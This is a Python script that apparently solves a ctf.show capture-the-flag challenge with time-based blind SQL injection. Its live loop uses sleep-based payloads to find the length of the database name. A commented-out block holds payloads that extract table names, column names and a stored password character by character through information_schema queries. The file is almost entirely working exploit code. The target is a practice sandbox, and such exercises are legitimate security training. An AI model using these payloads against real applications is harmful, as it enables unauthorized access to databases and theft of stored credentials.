import requests


url = "http://761bf9c8-831b-40ed-abcf-318a76a5f19a.challenge.ctf.show/api/"

result = ''


for i in range(1,20):
    payload = f"id=' and if(length(database()) = {i},sleep(3),0) --+q&page=1&limit=10"
    #尝试数据库名长度
    re = requests.post(url, params=payload)
    time = re.elapsed.total_seconds()
    print(f"{i}:{time}")

"""
for i in range(1,50):
    p = 1
    for j in range(32,128):
        #payload = f"id=1' and if(ascii(substr(database(),{i},1)) = {j},sleep(3),0) --+q&page=1&limit=10"
        #尝试数据库名
        #payload = f"id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema = 'ctfshow_web' limit 0,1),{i},1)) = {j},sleep(3),0) --+ q&page=1&limit=10"
        #尝试数据表名
        #payload = f"id=1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web'and table_name='ctfshow_user5' limit 0,1), {i}, 1)) = {j},sleep(1),0) --+ q&page=1&limit=10"
        #尝试列名
        #payload = f"id=1' and if(ascii(substr((select password from ctfshow_web.ctfshow_user5 where username='flag'), {i}, 1)) = {j},sleep(1),0) --+ q&page=1&limit=10"
        #尝试flag
        re = requests.get(url=url, params=payload)
        time = re.elapsed.total_seconds()
        if time >= 0.8:
            result = result + chr(j)
            print(f"result:{result}")
            p = 0
            break

    if p == 1:
        print("1")
        break
"""